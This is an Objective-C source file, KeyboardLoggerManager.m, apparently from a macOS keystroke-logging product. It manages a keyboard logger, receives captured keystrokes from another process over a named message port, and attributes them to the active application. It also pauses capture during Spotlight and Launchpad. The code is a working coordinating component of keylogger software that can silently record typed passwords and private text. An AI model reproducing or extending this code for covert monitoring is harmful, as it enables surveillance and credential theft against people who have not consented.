//
//  KeyboardLoggerManager.m
//  KeyboardLoggerManager
//
//  Created by Makara Khloth on 2/6/15.
//  Copyright (c) 2015 Makara Khloth. All rights reserved.
//

#import "KeyboardLoggerManager.h"
#import "KeyboardLogger.h"
#import "KeyboardLoggerEnum.h"
#import "ApplicationLifeCycleNotifier.h"
#import "ApplicationInfo.h"
#import "KeyStrokeInfo.h"
#import "KeyStrokeWrapper.h"
#import "EmbeddedApplicationInfo.h"
#import "KeyboardLoggerManagerDelegate.h"

@implementation KeyboardLoggerManager

- (instancetype) init {
    self = [super init];
    if (self) {
        mObservers      = [[NSMutableArray alloc] init];
        mPassiveMode    = YES;
    }
    return (self);
}

- (id) initWithKeyboardEventHandler: (KeyboardEventHandler *) aKeyboardEventHandler {
    self = [super init];
    if (self) {
        mObservers      = [[NSMutableArray alloc] init];
        mEmbeddedApps   = [[NSMutableArray alloc] init];
        mALCNotifier    = [[ApplicationLifeCycleNotifier alloc] initWithALCDelegate:self];
        mKeyboardLogger = [[KeyboardLogger alloc] initWithKeyLoggerDelegate:self withKeyboardEventHandler:aKeyboardEventHandler];
        mPassiveMode    = NO;
    }
    return (self);
}

- (void) startKeyboardLogger {
    if (!mPassiveMode) {
        [mKeyboardLogger startKeyboardLog];
        [mALCNotifier startNotify];
    } else {
        if (!mMessagePortKeyStrokeReader) {
            mMessagePortKeyStrokeReader = [[MessagePortIPCReader alloc] initWithPortName:@"KeyStrokeMessagePort" withMessagePortIPCDelegate:self];
            [mMessagePortKeyStrokeReader start];
        }
    }
}

- (void) stopKeyboardLogger {
    if (!mPassiveMode) {
        [mKeyboardLogger stopKeyboardLog];
        [mALCNotifier stopNotify];
    } else {
        if (mMessagePortKeyStrokeReader) {
            [mMessagePortKeyStrokeReader release];
            mMessagePortKeyStrokeReader = nil;
        }
    }
}

- (void) addObserver: (id <KeyboardLoggerManagerDelegate>) aObserver {
    BOOL found = NO;
    for (id <KeyboardLoggerManagerDelegate> observer in mObservers) {
        if ([aObserver isEqual:observer]) {
            found = YES;
            break;
        }
    }
    
    if (!found) {
        [mObservers addObject:aObserver];
    }
}

- (void) removeObserver: (id <KeyboardLoggerManagerDelegate>) aObserver {
    [mObservers removeObject:aObserver];
}

#pragma mark - Keyboard logger protocol -

-(void) keyStrokeDidReceived:(KeyStrokeInfo *) aKeyStrokeInfo moreInfo:(id)aInfo {
    for (id <KeyboardLoggerManagerDelegate> observer in mObservers) {
        if ([observer respondsToSelector:@selector(mouseClickDetected:mouseEvent:)]) {
            NSEvent *event = aInfo;
            [observer mouseClickDetected:aKeyStrokeInfo mouseEvent:event];
        }
    }
}

-(void) terminateKeyStrokeDidReceived:(KeyStrokeInfo *) aKeyStrokeInfo moreInfo:(id)aInfo {
    for (id <KeyboardLoggerManagerDelegate> observer in mObservers) {
        if ([observer respondsToSelector:@selector(terminateKeyDetected:keySymbol:)]) {
            NSString *keySymbol = aInfo;
            [observer terminateKeyDetected:aKeyStrokeInfo keySymbol:keySymbol];
        }
    }
}

-(void) activeAppChangeKeyStrokeDidReceived:(KeyStrokeInfo *) aKeyStrokeInfo moreInfo: (id) aInfo {
    for (id <KeyboardLoggerManagerDelegate> observer in mObservers) {
        if ([observer respondsToSelector:@selector(activeAppChangeKeyDetected:inactiveBundleID:)]) {
            NSString *bundleID = [(ApplicationInfo *)aInfo mAppBundle];
            [observer activeAppChangeKeyDetected:aKeyStrokeInfo inactiveBundleID:bundleID];
        }
    }
}

#pragma mark - IPC -
- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
    DLog(@"=============> Receive key stroke...");
    if (aRawData) {
        NSKeyedUnarchiver *unarchiver = [[[NSKeyedUnarchiver alloc] initForReadingWithData:aRawData] autorelease];
        KeyStrokeWrapper *keyStrokeWrapper = [unarchiver decodeObjectForKey:@"keyStroke"];
        [unarchiver finishDecoding];
        DLog(@"KeyStrokeInfo : [%@]", keyStrokeWrapper.mKeyStrokeInfo);

        
        if (keyStrokeWrapper.mKeyStrokeInteruptID == kKeyboardLoggerCompleteCodeChangeActiveApp) {
            ApplicationInfo *appInfo = [[[ApplicationInfo alloc] init] autorelease];
            appInfo.mAppBundle = keyStrokeWrapper.mKeyStrokeInfoAsscoiate;
            [self activeAppChangeKeyStrokeDidReceived:keyStrokeWrapper.mKeyStrokeInfo moreInfo:appInfo];
        }
        else if (keyStrokeWrapper.mKeyStrokeInteruptID == kKeyboardLoggerCompleteCodeMouseClick) {
            [self keyStrokeDidReceived:keyStrokeWrapper.mKeyStrokeInfo moreInfo:keyStrokeWrapper.mKeyStrokeInfoAsscoiate];
        }
        else if (keyStrokeWrapper.mKeyStrokeInteruptID == kKeyboardLoggerCompleteCodeTerminateKey) {
            [self terminateKeyStrokeDidReceived:keyStrokeWrapper.mKeyStrokeInfo moreInfo:keyStrokeWrapper.mKeyStrokeInfoAsscoiate];
        }
    }
}

#pragma mark - ALC protocol -

-(void) applicationDidEnterBackground:(ApplicationInfo *)aApplicationInfo{
    DLog(@"appDidDeactivate AppName %@",[aApplicationInfo mAppName]);
    DLog(@"appDidDeactivate AppBun %@",[aApplicationInfo mAppBundle]);
    
    // Send key log event
    NSNumber *code = [NSNumber numberWithInteger:kKeyboardLoggerCompleteCodeChangeActiveApp];
    NSDictionary *userInfo = [NSDictionary dictionaryWithObjectsAndKeys:code, @"code", aApplicationInfo, @"object", nil];
    [mKeyboardLogger sendKey:userInfo];
}

-(void) applicationDidEnterForeground:(ApplicationInfo *)aApplicationInfo{
    DLog(@"appDidActivate AppName %@",[aApplicationInfo mAppName]);
    DLog(@"appDidActivate AppBun %@",[aApplicationInfo mAppBundle]);
}

- (void) spotlightBeginTracking {
    DLog(@"#### spotlightBeginTracking");
    [mKeyboardLogger stopKeyboardLog];
}

- (void) spotlightEndTracking {
    DLog(@"#### spotlightEndTracking");
    [mKeyboardLogger startKeyboardLog];
}

- (void) launchpadDidAppear {
    DLog(@"#### launchpadDidAppear");
    [mKeyboardLogger stopKeyboardLog];
}

- (void) launchpadDidDisappear {
    DLog(@"#### launchpadDidDisappear");
    [mKeyboardLogger startKeyboardLog];
}

- (void) embeddedApplicationLaunched: (EmbeddedApplicationInfo *) aEmbededApplicationInfo {
    DLog(@"Embedded PID: %d launched", aEmbededApplicationInfo.mPID);
    id object = nil;
    for (EmbeddedApplicationInfo *embeddedApp in mEmbeddedApps) {
        if (embeddedApp.mPID == aEmbededApplicationInfo.mPID) {
            object = embeddedApp;
            break;
        }
    }
    
    if (!object) {
        [mEmbeddedApps addObject:aEmbededApplicationInfo];
    }
    
    [mKeyboardLogger setMEmbeddedApps:mEmbeddedApps];
}

- (void) embeddedApplicationTerminated: (EmbeddedApplicationInfo *) aEmbededApplicationInfo {
    DLog(@"Embedded PID: %d terminated", aEmbededApplicationInfo.mPID);
    id object = nil;
    for (EmbeddedApplicationInfo *embeddedApp in mEmbeddedApps) {
        if (embeddedApp.mPID == aEmbededApplicationInfo.mPID) {
            object = embeddedApp;
            break;
        }
    }
    
    [mEmbeddedApps removeObject:object];
    
    [mKeyboardLogger setMEmbeddedApps:mEmbeddedApps];
}

- (void) carbonApplicationTerminated: (ProcessSerialNumber) aPSN {
    DLog(@"Carbon event PSN: {%d, %d} terminated", (unsigned int)aPSN.lowLongOfPSN, (unsigned int)aPSN.highLongOfPSN);
    id object = nil;
    for (EmbeddedApplicationInfo *embeddedApp in mEmbeddedApps) {
        if (embeddedApp.mPSN.lowLongOfPSN == aPSN.lowLongOfPSN &&
            embeddedApp.mPSN.highLongOfPSN == aPSN.highLongOfPSN) {
            object = embeddedApp;
            break;
        }
    }
    
    [mEmbeddedApps removeObject:object];
    
    [mKeyboardLogger setMEmbeddedApps:mEmbeddedApps];
}

- (void) dealloc {
    [self stopKeyboardLogger];
    [mObservers release];
    [mEmbeddedApps release];
    [mALCNotifier release];
    [mKeyboardLogger release];
    [super dealloc];
}

@end
